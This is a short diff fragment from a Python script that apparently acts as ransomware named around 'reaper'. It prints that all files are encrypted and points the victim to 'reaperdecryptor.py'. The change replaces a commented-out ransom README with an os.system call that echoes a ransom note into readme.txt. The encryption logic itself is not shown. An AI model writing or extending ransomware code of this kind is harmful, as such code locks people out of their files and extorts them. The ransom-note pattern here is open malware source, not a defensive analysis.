@@ -27,6 +27,5 @@ for file in files:
 print (" All your files are encrypted! Luckily we have a decoder! ;)")
 print (" Find and run reaperdecryptor.py in the comman terminal to get your files back!")
 
-
-#with open ("README.txt","wb") as readme:
-	#readme.write("ATTENTION! All of your files have been locked and you need our special decryptor to make that happen. Luckily, it can be found on the desktop! You may delete this file")
+readme = ('echo "Your files are encrypted! Run reaperdecryptor.py to get them back!" > readme.txt')
+os.system(readme)
